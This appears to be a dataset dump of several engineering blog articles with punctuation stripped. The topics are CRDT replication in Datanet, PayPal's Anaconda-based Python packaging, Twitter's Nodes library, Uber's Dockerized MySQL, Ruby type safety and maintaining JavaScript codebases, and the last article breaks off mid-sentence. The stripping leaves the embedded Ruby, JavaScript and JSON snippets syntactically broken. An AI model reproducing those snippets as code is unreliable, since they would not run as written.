that receives and applies internal and external modifications and stores the results in a local cache   Changing the belief that CRDTs are impractical is important as we re not talking about niche use cases  CRDT style replication has been shown by Peter Bailis of Stanford to be applicable to 70  of the database calls in a large collection of top level github projects   What actually is a CRDT  What operations do you support and what s special about your implementation   CRDTs are pretty hard to explain  so I try to explain them using the following example  A social media site has a rack of app servers  each app server updates a global login counter on user login  Since updating a counter  by one  is a commutative operation replication requirements become looser  replication of individual increment by one operations can be applied in an arbitrary order and the final value of global login counter always turns out the same   Using CRDTs each app server increments a local global login counter and lazily broadcasts the increment operation to all other app servers who then apply the operation  At any point in time  there is no guarantee that all app servers will have the same value for global login counter  there are bound to be increment by one replication operations in flight  but the app servers  values quickly converge to the same value and all increments are guaranteed to be applied  i e  no data loss    This concept of commutative operations being locally applied  then lazily broadcast  then remotely applied  and eventually all actors converging to the same value can be generalized to include data types far more complex than a counter  and this family of data types is called CRDTs   Can you explain the architecture behind Datanet  Datanet s architecture begins at the individual actor level  Actors are mobile devices  browsers  app servers  memcache clusters     they are all database masters that have a local write thru cache of a portion of the entire system s data set  Datanet s architecture begins at the individual actor level  Actors are mobile devices  browsers  app servers  memcache clusters     they are all database masters that have a local write thru cache of a portion of the entire system s data set  Actors modify data in their local cache  then broadcast the modifications peer to peer  to all other actors caching the modified data  and the actors receiving these modifications will apply them to their local cache  Besides Actors there is a centralized component that deals w  K safety  e g  guarantee of 2 copies   drives distributed garbage collection  and deals with re syncing actors who were offline  Datanet s hybrid architecture is p2p for optimal replication latency   centralized for high availability  More info  http   www datanet company architecture html  Question  How much does Datanet cost  What s the licensing  Cost is free  BSD open source license Question  What s your dream for the future of Datanet  Datanet s CRDT algorithms can add value anywhere a write thru cache can add value  which is a long list of places in modern stacks  This means the future for Datanet has tons of possibilities  so the current dream is to penetrate as many places in the stack as possible  which we refer to as  Ubiquitous write thru caching   For example  at the micro level write thru caches can be utilized at the per thread   per process level for performance gains  At the data center level write thru caches can prefetch data to compute for serverless architectures and provide high availability for stateful app server clusters  At the WAN level write thru caches merge the conflicts inherent in multiple data center replication and make it feasible for CDNs to host dynamic real time data at the edge  More use case info  http   datanet company use_cases html  In Datanet  the same piece of data can simultaneously exist as a write able entity in many many places in the stack  Datanet is a different way of looking at data  Datanet more closely resembles an internet routing protocol than a traditional client server database     and this mirrors the current realities that data is much more in flight than it used to be  Datanet Links Website  http   datanet co   Twitter  https   twitter com CRDTDatanet  Github  https   github com JakSprats datanet  Google Group  https   groups google com forum   forum crdtdatanet  Russell Sullivan s Twitter  https   twitter com jaksprats CRDT Articles Readings in CRDTs  Comprehensive study of CRDTs  SwiftCloud  Shapiro talk  SEC   CRDTs  Related Articles
36,engineering,Python Packaging at PayPalYear after year  Pythonists all over are churning out more code than ever  People are learning  the ecosystem is flourishing  and everything is running smoothly  right up until packaging  Packaging Python is fundamentally un Pythonic  It can be a tough lesson to learn  but across all environments and applications  there is no one obvious  right way to deploy  Frankly  it s hard to think of an area where Python s Zen applies less   At PayPal  we write and deploy our fair share of Python  and we wanted to devote a couple minutes to our story and give credit where credit is due  For conclusion seekers  without doubt or further ado  Continuum Analytics  Anaconda Python distribution has made our lives so much easier  For small  and medium sized teams  no matter the deployment scale  Anaconda has big implications  But let s talk about how we got here   Right now  PayPal Python Infrastructure provides equitable support for Windows  OS X  Linux  and Solaris  supporting various combinations of 32 bit and 64 bit Python 2 6  Python 2 7  and PyPy 5   Glossing over the primordial days  when Kurt and I started building the Python platform at PayPal  we didn t know we would be building the first cross platform stack the company had ever seen  It was December 2012  we just wanted to see every developer unwrap a brand new laptop running PayPal Python services locally   What ensued was the most intense engineering sprint I had ever experienced  We ported critical functionality previously only available in shared objects we had been calling into with ctypes  Several key parts were available in binary form only and had to be disassembled  But with the New Year  2013  we were feeling like a whole new stack  All the PayPal specific parts of our framework were pure Python and portable  Just needed to install a few open source libraries  like gevent  greenlet  maybe lxml  Just pip install   right   In an environment where Python is still a new technology to most  pip is often not available  let alone understood  This learning curve can represent a major hurdle to many  We wanted more people to be able to write Python  and even more to be able to run it  as many places as possible  regardless of whether they were career Pythonists  So with a judicious shake of Python simplicity  we adopted a policy of  vendoring in  all of our core dependencies  including compiled extensions  like gevent   This model yields somewhat larger repositories  but the benefits outweighed a few extra seconds of clone time  Of all the local development stories  there is still no option more empowering than the fully self contained repository  Clone and run  A process so seamless  it s like a miniature demo that goes perfect every time  In a world of multi hour C   and Java builds  it might as well be magic    So what s the problem    Static builds  Every few months  or every CVE  the Python team would have to sit down to refresh  regression test  and certify a new set of libraries  New libraries were added sparingly  which is great for auditability  but not so great for flexibility  All of this is fine for a tight set of networking  cryptography  and serialization libraries  but no way could we support the dozens of dependencies necessary for machine learning and other advanced Python use cases   And then came Anaconda  With the Anaconda Python distribution  Continuum is doing effectively what our team had been doing  but for free  for everyone  for hundreds of libraries  Finally  there was a standard option that made Python even simpler for our developers   As soon as we had the opportunity  we made Anaconda a supported platform for development  From then on  regardless of platform  Python beginners got one of two introductions  Install Anaconda  or visit our shared Jupyter Notebook  also backed by Anaconda   Today  Anaconda has gone beyond development environments to enable production PayPal machine learning applications for the better part of a year  And it s doing so with more optimizations than we can shake a stick at  including running all the intensive numerical operations on Intel s MKL  From now on  Python applications exist on a moving walkway to production perfection   This was realized through two Anaconda packaging models that work for us  The first preinstalls a complete Anaconda on top of one of PayPal s base Docker images  This works  and is buzzword compliant  but for reasons outside the scope of this post  also entails maintaining a single large Docker image with the dependencies of all our downstream users   As with all packaging  there s always another way  One alternative approach that has worked well for us involves a little Continuum project known as Miniconda  This minimalist distribution has just enough to make Python and conda work  At build time  our applications package Miniconda  the bzip2 conda archives of the dependencies  and a Python installer  wrapped up with a CalVer filename  At deploy time  we install Miniconda  then conda install the dependencies  No downloads  no compilation  no outside dependencies  The code is only a little longer than the description of the process  Conda envs are more powerful than virtualenvs  and have a better cross platform  cross dev prod story  as well  Developers enjoy the increased control  smaller packages  and applicability across both standard and containerized environments   As stated in Enterprise Software with Python  packaging and deployment is not the last step  The key to deployment success is uniform  well specified environments  with minimal variation between development and production  Or use Anaconda and call it good enough  We sincerely thank the Anaconda contributors for their open source contributions  and hope that their reach spreads to ever more environments and runtimes 
37,engineering,Simplify Service Dependencies with NodesRPC services can be messy to implement  It can be even messier if you go with microservices  Rather than writing a monolithic piece of software that s simple to deploy but hard to maintain  you write many small services each dedicated to a specific functionality  with a clean scope of features  They can be running in different environments  written at different times  and managed by different teams  They can be as far as a remote service across the continent  or as close as a logical component living in your own server process providing its work through an interface  synchronous or asynchronous  All said  you want to put together the work of many smaller components to process your request   This was exactly the problem that Blender  one of the major components of the Twitter Search backend  was facing  As one of the most complicated services in Twitter  it makes more than 30 calls to different services with complex interdependencies for a typical search request  eventually reaching hundreds of machines in the data center darkness  Since its deployment in 2011  it has gone through several generations of refactoring regarding its dependency handling   At the beginning  it was simple  We had to call several backend services and put together a search response with the data collected  It s easy to notice the dependencies between them  you need to get something from service A if you want to create a request for service B and C  whose responses will be used to create something to query service D with  and so on  We can draw a Directed Acyclic Graph  DAG  for dependencies between services in the workflow that processes the request  like this one   Figure 1  Obviously there s some parallelism we can exploit  service B and C can be executed at the same time  as can D and E  as they don t depend on each other  Our first solution for the execution was to run a topological sort on the graph and break it into batches  All services in the same batch can be run at the same time  Batches were implemented using Netty pipeline and there is effectively a barrier at the end of each batch  so the workflow will only proceed to the next batch when all service calls in the current one have finished  The responses from all services are put into a shared store  a monolithic function pulls necessary responses from it to create new requests for services in the next batch   This design works for simple workflows  but there are some problems  First  its execution is not efficient  Clearly service E can start as soon as C is done and doesn t have to wait on B  as it doesn t depend on it  However  they are in different batches  so it has to wait  What if B takes a long time  This introduces a false dependency and reduces parallelism  Second  and more importantly  there s no enforcement of the data dependency because of the shared response store  The graph above only defines the execution order  When you create the request for service D  there s nothing preventing you from fetching things other than responses from B or C  like E s response  You can try to get responses from services not executed yet  and it needed a lot of programmer s discretion to get things right   Another problem is that we only allowed one instance of each service in the graph  so it was not easy to call the same service multiple times within a single request  It was also hard to write code that made dynamic decisions regarding the execution of the graph based on the execution state  e g  skipping a section of graph  Everything was fixed in advance   What if you want to reuse a part or all of a graph  It s hard  Each workflow is conceptually a graph  merging multiple graphs should just get you a bigger graph  not something totally different  We were not properly exploiting the recursive nature of graphs to simplify our code  The lack of modularity in the code also made testing hard  as there was no straightforward way to pull out a piece of workflow and test it   We used to have separate workflows  each being a graph  for different types of search  like search for Tweets  search for accounts  etc  The frontend had to make multiple calls to the backend to get results together and display them  We wanted to create a composite search result page with all kinds of results processed together  so that we have a better chance of organizing them nicer in a stream  This was our  Universal Search  project back in 2012  Merging many existing graphs  workflows  into a new one was pretty much a handicraft  you had to resolve conflicts  watch out for duplicate service calls  and even manually adjust graph edges to work around the batching to get optimized execution  not wasting much parallelism  Adding a tiny edge in the graph could throw off your batching and accidentally increase the latency  This was definitely not the right thing to keep in the long run  Our complexity had outgrown the design  and we needed to have something new   Around mid 2011  Twitter released Finagle  a Scala library to implement protocol agnostic RPC systems  It introduced a nice paradigm for concurrent programming with Futures  A Future represents an asynchronous data object whose value will become available some time in the  well  future  It supports a set of operations for transforming them  merging them  and dealing with their failure and exceptions with callbacks  Logically  this is bridging the barrier of synchronous and asynchronous programming  Your logic is still function like  taking inputs and producing an output  except that inputs could be asynchronous and not ready when the function call is made  or attached   so it has to wait  The concept of Future decouples the computation logic from the execution of the dependency graph  allowing programmers to better focus on the application logic  rather than gathering and synchronizing the things produced in various threads   Finagle was a natural fit for Blender as it solved a big problem we had on the service batch design  the dependencies are actually between the data  not between the computation processes themselves that generate the data  From the perspective of a computation process  where its inputs are produced is irrelevant  it can flow in from anywhere  With this idea  we can redraw our dependency graph   Figure 2  In the diagram  we have separated the data  gray boxes  and the computation processes  blue dots   Each process takes one or more pieces of data as inputs  and produces a single output  The process can start as soon as its input are ready  and not subject to any arbitrary batching  You can easily write every process as a function  in Java   e g  for process D   Internally  there could be one of the following mirror functions that provides the real logic  depending on whether the actually process to produce D s response is synchronous or asynchronous   Notice that they have all input arguments  de futured   that is  they are only called when the values for B and C are ready and resolved into their original types  which is guaranteed by the scheduling execution framework  The framework we used is Finagle  or its Futures programming paradigm to be more specific  This function duality between process   and syncProcess asyncProcess   is just an artifact of the fact that asynchronous processing is not a primitive action in our programming language  Java   Finagle fills this gap with its Future operations  Now you can write code like   or  if the value of D cannot be directly computed  but has to be acquired through a remote service   The application logic is only in syncProcess   or asyncProcess    but there s a lot of boilerplate code to just connect the worlds of Futures and non Futures  When it comes to multiple inputs and complex dependency chains  it can again become a bit messy  You can de future your Futures at any place and end up having some methods with partly Future and partly non Future arguments  Sometimes you want to have control flow logic on Futures  like  if Future A  has value X then we compute Future B  this way  or we call process X and produce it another way   You end up with a lot of callbacks and risk running out of indentations had you not properly organized your calls  The dual functions are also not very elegant  resulting in boilerplate and repetitive code  Java should take part of the blame  it looks better in Scala  and also in Java 8 with lambdas   but it s also because the asynchronous processing here is still not transparent enough  The Future programming paradigm provides good primitives  but the computation logic lives in the cracks of these primitives   it s the glue putting them together that ruins the readability   Nonetheless  Finagle still solved a huge problem for us as we now have real data dependencies and a more efficient execution engine  We gradually converted the Blender workflow code from batch style to Future style in 2013  It ran faster  the code became less error prone but the readability was still not perfect  It was hard to follow  a pain to debug  tricky to test  and there were lots of duplicate function names   Then we introduced Nodes   Let s look at the modified dependency graph again   Figure 3  The process D takes input B and C  and produces a value of type D  Rather than passing them around as Future B   Future C  and Future D   we come up with a new concept of Node  a Future like object which combines the computation logic and the data being produced  and abstracts away the  de futuring  code that had to coexist with the computation logic before  Unlike Futures  Nodes can have dependencies declared in it  and you can construct a Node with all its dependencies  However  a node can also have no dependency at all  wrapping directly around a computation process or even a literal value  Nodes and Futures are compatible and mutually convertible  so we could migrate our original code piece by piece   You can consider Node as an asynchronous processing unit  it can be instantiated as many times as you wish  each time taking the same or different inputs  Depending on how many inputs you have  we provide several styles for you to specify them  either through a simple mapping with Java 8 lambdas  or from enum based named dependencies handled in a separate class if the logic is more complex  It doesn t matter if your computation is big or small  remote or local  synchronous or asynchronous  The Nodes library makes all these transparent to the programmer assembling the graph  It doesn t say how each Future is to be fulfilled  this matters only to the Nodes that actually does asynchronous computations  The scheduling of these computations could be completely blocking  or based on thread pools implemented by yourself  or provided by other frameworks  like Finagle   To implement the dependency graph in Figure 1 above  your code may look like   Here it lists several possible ways to wrap and create Nodes  though not exhaustively  With Nodes  all dependencies are explicit  and a computation process in the Node would only have access to the data it explicitly depends on  Dependencies can be defined as required or optional  A Node s failure  say  an exception is thrown during its execution  won t affect the downstream Node optionally depending on it   A Node will not automatically execute once it s created  this only sets up the dependency graph  You need to call  apply   on the node you want response for  This will in turn trigger the execution of all its dependencies  and recursively their dependencies  A Node will execute only once and cache its result   We provide a lot of convenient utilities on top of Nodes to make writing asynchronous code even easier   Operations to transform nodes like  map   and  flatMap    like you would find on Futures   Control flow support  you can create conditional code based on the value or the state of a node   Boolean operations for nodes with boolean value types   Subgraph support  you can organize nodes into subgraphs  each capable of returning multiple outputs  compared to only one on a single node  This allow you to keep the code modular and easy to reuse a part of a complex graph   Debug logging support  even without adding any code  Nodes framework automatically generates debug information for you to track the execution of the graph and also provides an API to add your custom debug information at different debug levels   Visualization  the Nodes library can automatically generates the visualization of your dependency graph in  dot format  viewable and exportable with GraphViz   Here is an example of the graph generated from our example code on Github   Figure 4  We have created a set of guidelines and best practices for writing Nodes code available with our tutorials on Github   After using this compact library for two years in our production search backend and serving billions of requests  we believe it s mature enough to release to the open source community  We have saved thousands of lines of code  improved our test coverage and ended up with code that s more readable and friendly for newcomers  We believe this can help other engineers writing concurrent applications or services  especially making it much easier to implement complex dependency graphs   The application of Node can be taken farther than merely writing RPC services  It doesn t have to be for short lived executions like processing server requests  What if a Future can take days to fulfill  What if you can serialize and checkpoint the state of a graph and even resume it  We have experimented with some of these idea and are looking forward to seeing other novel applications of the Nodes framework   You can download Nodes from https   github com twitter nodes and read our tutorials and example code   Many people have contributed to this library  they are  Brian Guarraci  Tian Wang  Yatharth Saraf  Lisa Huang  Juan Manuel Caicedo  Andy Schlaikjer 
38,engineering,Dockerizing MySQL at Uber Engineeringby Joakim Recht  Uber Engineering s Schemaless storage system powers some of the biggest services at Uber  such as Mezzanine  Schemaless is a scalable and highly available datastore on top of MySQL  clusters  Managing these clusters was fairly easy when we had 16 clusters  These days  we have more than 1 000 clusters containing more than 4 000 database servers  and that requires a different class of tooling   Initially  all our clusters were managed by Puppet  a lot of ad hoc scripts  and manual operations that couldn t scale at Uber s pace  When we began looking for a better way to manage our increasing number of MySQL clusters  we had a few basic requirements   Run multiple database processes on each host  Automate everything  Have a single entry point to manage and monitor all clusters across all data center  The solution we came up with is a design called Schemadock  We run MySQL in Docker containers  which are managed by goal states that define cluster topologies in configuration files  Cluster topologies specify how MySQL clusters should look  for example  that there should be a Cluster A with 3 databases  and which one should be the master  Agents then apply those topologies on the individual databases  A centralized service maintains and monitors the goal state for each instance and reacts to any deviations   Schemadock has many components  and Docker is a small but significant one  Switching to a more scalable solution has been a momentous effort  and this article explains how Docker helped us get here   Why Docker in the first place   Running containerized processes makes it easier to run multiple MySQL processes on the same host in different versions and configurations  It also allows us to colocate small clusters on the same hosts so that we can run the same number of clusters on fewer hosts  Finally  we can remove any dependency on Puppet and have all hosts be provisioned into the same role   As for Docker itself  engineers build all of our stateless services in Docker now  That means that we have a lot of tooling and knowledge around Docker  Docker is by no means perfect  but it s currently better than the alternatives   Why not use Docker   Alternatives to Docker include full virtualization  LXC containers  and just managing MySQL processes directly on hosts through for example Puppet  For us  choosing Docker was fairly simple since it fits into our existing infrastructure  However  if you re not already running Docker then just doing it for MySQL is going to be a fairly big project  you need to handle image building and distribution  monitoring  upgrading Docker  log collection  networking  and much more   All of this means that you should really only use Docker if you re willing to invest quite a lot of resources in it  Furthermore  Docker should be treated as a piece of technology  not a solution to end all problems  At Uber we did a careful design which had Docker as one of the components in a much bigger system to manage MySQL databases  However  not all companies are at the same scale as Uber  and for them a more straightforward setup with something like Puppet or Ansible might be more appropriate   The Schemaless MySQL Docker Image  At the base of it  our Docker image just downloads and installs Percona Server and starts mysqld this is more or less like the existing Docker MySQL images out there  However  in between downloading and starting  a number of other things happen   mysql_install_db and create some default users and tables  For a minion   initiate a data sync from backup or another node in the cluster  If there is no existing data in the mounted volume  then we know we re in a bootstrap scenario  For a master  run  Once the container has data  mysqld will be started   If any data copy fails  the container will shut down again   The role of the container is configured using environment variables  What s interesting here is that the role only controls how the initial data is retrieved the Docker image itself doesn t contain any logic to set up replication topologies  status checking  etc  Since that logic changes much more frequently than MySQL itself  it makes a lot of sense to separate it   The MySQL data directory is mounted from the host file system  which means that Docker introduces no write overhead  We do  however  bake the MySQL configuration into the image  which basically makes it immutable  While you can change the config  it will never go into effect due to the fact that we never reuse Docker containers  If a container shuts down for whatever reason  we don t just start it again  We delete the container  create a new one from the latest image with the same parameters  or new ones if the goal state has changed   and start that one instead   Doing it this way gives us a number of advantages   Configuration drift is much easier to control  It boils down to a Docker image version  which we actively monitor   Upgrading MySQL is a simple matter  We build a new image and then shut containers down in an orderly fashion   If anything breaks we just start all over  Instead of trying to patch things up  we just drop what we have and let the new container take over   Building the image happens through the same Uber infrastructure that powers stateless services  The same infrastructure replicates images across data centers to make them available in local registries   There s a disadvantage of running multiple containers on the same host  Since there is no proper I O isolation between containers  one container might use all the available I O bandwidth  which then leaves the remaining containers starved  Docker 1 10 introduced I O quotas  but we haven t experimented with those yet  For now we cope with this by not oversubscribing hosts and continuously monitoring the performance of each database   Scheduling Docker Containers and Configuring Topologies  Now that we have a Docker image that can be started and configured as either master or minion  something needs to actually start these containers and configure them into the right replication topologies  To do this  an agent runs on each database host  The agents receive goal state information for all the databases that should be running on the individual hosts  A typical goal state looks like this    schemadock01 mezzanine mezzanine us1 cluster8 db4       app_id    mezzanine mezzanine us1 cluster8 db4     state    started     data       semi_sync_repl_enabled   false    name    mezzanine us1 cluster8 db4     master_host    schemadock30     master_port   7335    disabled   false    role    minion     port   7335    size    all         This tells us that on host schemadock01 we should be running one Mezzanine database minion on port 7335  and it should have the database running on schemadock30 7335 as master  It has size  all   which means it s the only database running on that host  so it should have all memory allocated to it   How this goal state is created is a topic for another post so we ll skip to the next steps  an agent running on the host receives it  stores it locally  and starts processing it   The processing is actually an endless loop that runs every 30 seconds  somewhat like running Puppet every 30 seconds  The processing loop checks whether the goal state matches the actual state of the system through the following actions   Check whether a container is already running  If not  create one with the configuration and start it  Check whether the container has the right replication topology  If not  try to fix it  If it s a minion but should be a master verify that it s safe to change to master role  We do this by checking that the old master is read only and that all GTIDs have been received and applied  Once that is the case  it s safe to remove the link to the old master and enable writes   If it s a master but should be disabled  turn on read only mode   If it s a minion but replication is not running  then set up the replication link  Check various MySQL parameters   read_only and super_read_only   sync_binlog   etc   based on the role  Masters should be writeable  minions should be read_only  etc  Furthermore  we reduce the load on the minions by turning off binlog fsync and other similar parameters    Start or shut down any support containers  such as pt heartbeat and pt deadlock logger    Note that we very much subscribe to the idea of single process  single purpose containers  That way we don t have to reconfigure running containers  and it s much easier to control upgrades   If an error happens at any point  the process just raises an error and aborts  The whole process is then retried in the next run  We make sure to have as little coordination between individual agents as possible  This means that we don t care about ordering  for example  when provisioning a new cluster  If you re manually provisioning a new cluster you would probably do something like this   Create the MySQL master and wait for it to become ready Create the first minion and connect it to the master Repeat for the remaining minion  Of course  eventually something like this has to happen  What we don t care about is the explicit ordering  though  We ll just create goal states reflecting the final state we want to achieve    schemadock01 mezzanine cluster1 db1       data       disabled   false    role    master     port   7335    size    all           schemadock02 mezzanine cluster1 db2       data       master_host    schemadock01     master_port   7335    disabled   false    role    minion     port   7335    size    all           schemadock03 mezzanine cluster1 db3       data       master_host    schemadock01     master_port   7335    disabled   false    role    minion     port   7335    size    all         This is pushed to the relevants agents in random order and they all start working on it  To reach the goal state  a number of retries might be required  depending on the ordering  Usually  the goal states are reached within a couple of retries  but some operations might actually require 100s of retries  For example  if the minions start processing first then they won t be able to connect to the master  and they have to retry later  Since it might take a little time to get the master up and running  the minions might have to retry a lot of times   An example of 2 minions starting up before the master  On the initial startup  steps 1 and 2   the minions won t be able to get a snapshot from the master  which will fail the startup process  Then the master starts up in step 3  and the minions are able to connect and sync data in step 4 and 5   Experience with the Docker Runtime  Most of our hosts run Docker 1 9 1 with devicemapper on LVM for storage  Using LVM for devicemapper has turned out to perform significantly better than devicemapper on loopback  devicemapper has had many issues around performance and reliability  but alternatives such as AuFS and OverlayFS have also had a lot of issues   This means that there has been a lot of confusion in the community about the best storage option  By now  OverlayFS is gaining a lot of traction and seems to have stabilized  so we ll be switching to that and also upgrade to Docker 1 12 1   One of the pain points of upgrading Docker is that it requires a restart  which also restarts all containers  This means that the upgrade process has to be controlled so that we don t have masters running when we upgrade a host  Hopefully  Docker 1 12 will be the last version where we have to care about that  1 12 has the option to restart and upgrade the Docker daemon without restarting containers   Each version comes with many improvements and new features while introducing a fair number of bugs and regressions  1 12 1 seems better than previous versions  but we still face some limitations   docker inspect hangs sometimes after Docker has been running for a couple of days   Using bridge networking with userland proxy results in strange behavior around TCP connection termination  Client connections sometimes never receive an RST signal and stay open no matter what kind of timeout you configure   Container processes are occasionally reparented to pid 1  init   which means that Docker loses track of them   We regularly see cases where the Docker daemon takes a very long time to create new containers   Summary  We set out with a couple of requirements for storage cluster management at Uber   Multiple containers running on the same host Automation A single point of entry  Now  we can perform day to day maintenance through simple tools and a single UI  none of which require direct host access   Screenshot from our management console  From here  we can follow goal state progress  in this case where we are splitting a cluster into two by first adding a 2nd cluster and then cutting the replication link   We can better utilize our hosts by running multiple containers on each one  We can do fleet wide upgrades in a controlled fashion  Using Docker has gotten us here quickly  Docker has also allowed us to run a full cluster setup locally in a test environment and try out all the operational procedures   We started the migration to Docker in the beginning of 2016  and by now we are running around 1500 Docker production servers  for MySQL only  and we have provisioned around 2300 MySQL databases   There is much more to Schemadock  but the Docker component has been a great help to our success  allowing us to move fast and experiment while also hooking into existing Uber infrastructure  The entire trip store  which receives millions of trips every day  now runs on Dockerized MySQL databases together with other stores  Docker has  in other words  become a critical part of taking Uber trips   Joakim Recht is a staff software engineer in Uber Engineering s Aarhus office  and tech lead on Schemaless infrastructure automation   Photo Credits for Header   Humpback Whale Megaptera novaeangliae  by Sylke Rohrlach  licensed under CC BY 2 0  Image cropped for header dimensions and color corrected     To be precise  Percona Server 5 6    sync_binlog   0 and innodb_flush_log_at_trx_commit   2    A small selection of issues  https   github com docker docker issues 16653  https   github com docker docker issues 15629  https   developerblog redhat com 2014 09 30 overview storage scalability docker   https   github com docker docker issues 12738
39,engineering,Duck typing vs type safety in RubyDuck typing is one of the virtues of the Ruby language  it adds a lot of flexibility to the code  and allows us to use objects of different type in places where only specific methods are needed  Even though the idea behind duck typing may seem to be straight forward  it is easy to use it incorrectly  It s interesting to notice that over many years we ve adopted various techniques that seem to leverage duck typing  but the specifics of how exactly we re doing it are actually questionable  and I believe they deserve some reconsideration  This is directly related to the other important subject   type safety  and in this article I d like to explain why we should care about it  while keeping duck typing in mind  too   The problem with blank  method  Using blank  method  typically provided by ActiveSupport  is extremely common in Ruby Rails applications  People think it s a good example of duck typing   we rely on this single method  so we don t care if it s an array  string or nil   Here s a different way to think about it   the fact we have this method is a problem  as it can easily cause unexpected values to sneak into our system  and it also leads to additional complexity that is completely unnecessary   Consider this common pattern   def process   collection   unless collection   blank  collection   map     element       end end  We want to map a collection  but it could be what  An empty array  An empty string  Why is it even possible that this method can receive an empty string  This is the type of questions that are worth asking   The only reason why such conditionals are needed is that we don t handle data at the boundaries of our system explicitly  This means we re happily passing in something right into the core of our system  and then  protect  ourselves by adding a bunch of conditionals to various places  so that our system won t crash   This is how this method should look like instead   def process   collection   collection   map     element       end  The blank  method has a symbolic meaning here   it shows that instead of solving the root problem  by handling input data explicitly in a type safe manner  we ve chosen to complicate our code with monkey patches and extra conditionals   Without the extra blank  check  we still rely on duck typing  Notice that the collection can be anything that responds to map   Furthermore  its elements will also be handled via duck typing  You may start with a simple array  and later on change it to a custom enumerable object with map yielding compatible  duck typed elements  and you re all good   Type safety  Ruby with its duck typing may create an impression that type safety is not needed  or even that type safety is against duck typing  This is most certainly not true   One of the reasons of rapidly growing complexity and potential security problems is the lack of type safety at the boundaries  like HTTP params  Any external system which provides data to our applications should be treated with special care   Type safety in Ruby means that we want to make sure that the structure of the input data  as well as specific values in that structure  are valid in terms of basic constraints  Furthermore  type safety goes hand in hand with object coercions  You can easily reduce complexity of your application by making sure that specific values are properly coerced into types that are simple to work with   Let s go back to the trivial process method example  Imagine our system receives params as JSON  and one of the fields is called  collection  that we expect to be an array  How do you express this expectation   You can either write custom code or just use a dedicated tool  like dry validation   Schema   Dry    Validation   JSON do required    collection    value    array    end params     collection   w foo bar baz    result   Schema     params   process   result    collection    if result   success   This way you establish an explicit contract between the outer layer of your system which deals with http params  and your core application layer  which says  my system will process params only when collection key is present and its value is an array   but this is obviously a trivial case  let s make it more complex   What if our requirement is that it must be an array  with minimum 3 elements  and each element must be a string with minimum 2 characters  Imagine how your code would look like if you wanted to add guarding clauses for all these requirements  hint  it would be awful   Because handling such constraints manually leads to a lot of additional complexity  we tend to either do it only partially  ie by not checking everything  which results in less robust code  or just skip it altogether assuming that  it s gonna be fine   and it rarely is    With a dedicated gem like dry validation this type of constraints are easy to express   Schema   Dry    Validation   JSON   required    collection     array    min_size    3     each    str    min_size    2       Schema     collection        errors     collection    must be an array    Schema     collection     foo     bar      errors     collection    size cannot be less than 3    Schema     collection   w foo bar b     errors     collection   2    size cannot be less than 2     Schema     collection     foo     bar    1     errors     collection   2    must be a string     Schema     collection   w foo bar baz     errors       You may get an impression that this is now more complicated  but in reality it s the exact opposite  Most bugs are caused by unexpected or invalid values that are leaking into places of your system where it doesn t know how to handle them properly  so it crashes  You start fixing bugs by adding more and more conditionals  and in case of Rails and many Ruby apps  you use monkey patches like present  or blank    which sort of expresses what the contracts are  but it s vague  incomplete and implicit  and most importantly it does not guarantee that the core of your system receives valid input exclusively   Summary  Handling data in a type safe manner is a technique that makes your applications simpler and more robust  Even though it requires additional gems  as the problem domain is complex enough to justify extra libraries  you need data validation anyway  and you most likely already use a gem which provides that  ie ActiveModel   Regardless of the tools you decide to use  I encourage you to think about type safety when you re building a Ruby application  and validate data at the boundaries of your system  It s not against duck typing  you could even say it s a complementary concept  as through type safety you can perform all kinds of coercions to adjust input data in a way that will make your system simpler and leverage duck typing at the same time   There s much more to say about duck typing though  but I m leaving that for another article 
40,engineering,Writing Maintainable JavaScriptThis article was peer reviewed by Tom Greco  Dan Prince and Yaphi Berhanu  Thanks to all of SitePoint s peer reviewers for making SitePoint content the best it can be   Almost every developer has had the experience of maintaining or taking over a legacy project  Or  maybe it s an old project which got picked up again  Common first thoughts are to throw away the code base  and start from scratch  The code can be messy  undocumented and it can take days to fully understand everything  But  with proper planning  analysis  and a good workflow  it is possible to turn a spaghetti codebase into a clean  organised  and scalable one   I ve had to take over and clean up a lot of projects  There haven t been many I started from scratch  In fact  I am currently doing exact that  I ve learned a lot regarding JavaScript  keeping a codebase organised and   most importantly   not being mad at the previous developer  In this article I want to show you my steps and tell you my experience   Analyse the Project  The very first step is to get an overview of what is going on  If it s a website  click your way through all the functionality  open modals  send forms and so on  While doing that  have the Developer Tools open  to see if any errors are popping up or anything is getting logged  If it s a Node js project  open the command line interface and go through the API  In the best case the project has an entry point  e g  main js   index js   app js      where either all modules are initialized or  in the worst case  the entire business logic is located   Find out which tools are in use  jQuery  React  Express  Make a list of everything that is important to know  Let s say the project is written in Angular 2 and you haven t worked with that  go straight to the documentation and get a basic understanding  Search for best practices   Understand the Project on a Higher Level  Knowing the technologies is a good start  but to get a real feel and understanding  it s time to look into the unit tests  Unit testing is a way of testing functionality and the methods of your code to ensure your code behaves as intended  Reading   and running   unit tests gives you a much deeper understanding than reading only code  If they are no unit tests in your project  don t worry  we will come to that   Create a Baseline  This is all about establishing consistency  Now that you have all information about the projects toolchain  you know the structure and how the logic is connected  it s time to create a baseline  I recommend adding an  editorconfig file to keep coding style guides consistent between different editors  IDE s  and developers   Coherent indentation  The famous question  it s rather a war though   whether spaces or tabs should be used  doesn t matter  Is the codebase written in spaces  Continue with spaces  With tabs  Use them  Only when the codebase has mixed indentation is it necessary to decide which to use  Opinions are fine  but a good project makes sure all developer can work without hassle   Why is this even important  Everyone has it s own way of using an editor or IDE  For instance  I am a huge fan of code folding  Without that feature  I am literally lost in a file  When the indentation isn t coherent  this features fails  So every time I open a file  I would have to fix the indentation before I can even start working  This is a huge waste of time      While this is valid JavaScript  the block can t    be properly folded due to its mixed indentation  function foo  data    let property   String data   if  property      bar     property   doSomething property           more logic       Correct indentation makes the code block foldable     enabling a better experience and clean codebase  function foo  data    let property   String data   if  property      bar     property   doSomething property           more logic     Naming  Make sure that the naming convention used in the project is respected  CamelCase is commonly used in JavaScript code  but I ve seen mixed conventions a lot  For instance  jQuery projects often have mixed naming of jQuery object variables and other variables      Inconsistent naming makes it harder    to scan and understand the code  It can also    lead to false expectations  const  element       element    function _privateMethod      const self     this   const _internalElement       internal element    let  data   element data  foo          more logic       This is much easier and faster to understand  const  element       element    function _privateMethod      const  this     this   const  internalElement       internal element    let elementData    element data  foo          more logic     Linting Everything  While the previous steps were more cosmetic and mainly to help with scanning the code faster  here we introduce and ensure common best practices as well as code quality  ESLint  JSLint  and JSHint are the most popular JavaScript linters these days  Personally  I used to work with JSHint a lot  but ESLint has started to become my favorite  mainly because of its custom rules and early ES2015 support   When you start linting  if a lot of errors pop up  fix them  Don t continue with anything else before your linter is happy   Updating Dependencies  Updating dependencies should be done carefully  It s easy to introduce more errors when not 